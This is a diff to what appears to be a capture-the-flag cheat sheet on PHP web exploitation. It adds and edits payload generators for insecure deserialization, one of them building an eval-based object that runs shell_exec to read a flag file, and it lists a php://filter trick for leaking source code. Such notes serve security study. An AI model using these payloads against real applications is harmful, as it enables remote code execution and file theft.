@@ -30,13 +30,11 @@
 
 ### Example Payload Generator
 ```php
-<?php
 class access_log
 {
 	public $log_file = "../flag";
 }
 print(urlencode(base64_encode(serialize(new access_log()))))
-?>
 ```
 
 That was for this vulnerable code
@@ -60,6 +58,28 @@ try{
   die("Deserialization error. ".$perm);
 }
 ```
+
+### Another Example of PHP Object Serialisation Vulnerabilities
+
+```php
+// Generates a payload: Please identify your entrypoint (ie where is it unserialised)
+class User {
+	public $name;
+	function set_name($name) {$this->name = $name;}
+	function get_name() {return $this->name;}
+}
+
+class User2 {
+	public $name;
+	function set_name($name) {$this->name = $name;}
+	function get_name() {return eval($this->name);}
+}
+
+$userobj = new User2();
+$userobj->set_name("return shell_exec('cat flag');");
+echo base64_encode(serialize($userobj));
+```
+
 
 ## Leaking source code with file=something
 - `file=php://filter/convert.base64-encode/resource=filename.php`
@@ -89,6 +109,8 @@ try{
 ## unserialize()
 
 Similar to Python's 
+
+PHP's serialisation is quite stupid, just change the value itself and edit the string length.
 
 ## PHP Filter Chaining
 
